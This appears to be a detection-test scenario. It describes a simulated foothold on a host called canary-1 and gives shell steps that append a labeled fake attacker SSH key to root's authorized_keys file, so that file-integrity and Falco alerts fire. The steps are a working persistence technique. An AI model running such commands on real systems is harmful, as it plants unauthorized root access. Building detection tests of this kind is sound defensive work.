description: Foothold on canary-1 appends an attacker SSH public key to /root/.ssh/authorized_keys — classic persistence via credential installation. Produces file-integrity (rule-550) + syscall (Falco write-below-etc / write-sensitive-file) signals.

steps.cmd:
mkdir -p /root/.ssh && chmod 700 /root/.ssh
ts=$(date +%s)
echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD_fake_key_0_${ts}_attacker attacker@elsewhere" \
  >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
ls -la /root/.ssh/authorized_keys
